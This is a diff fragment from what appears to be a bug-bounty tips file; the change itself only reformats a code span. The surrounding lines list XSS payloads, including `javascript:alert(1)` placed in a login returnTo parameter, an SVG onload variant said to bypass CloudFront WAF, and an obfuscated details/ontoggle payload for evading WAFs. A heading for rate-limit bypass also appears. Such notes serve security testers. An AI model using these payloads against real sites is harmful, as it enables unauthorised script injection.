@@ -9,7 +9,7 @@ reportError(name , enerror=eval)
 2-If you see `returnTo=` in login url , add `javascript:alert(1)` and login > xss alert.<br>
 3-Amazon CloudFront WAF sometimes can be easily bypassed with `<svg onload=(alert)(1)` instead of `<svg onload=alert(1)`<br>
 4-Bypass Waf <br>
-`<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//`
+```<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//```
 # Rate limit bypass
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
 # Line terminators
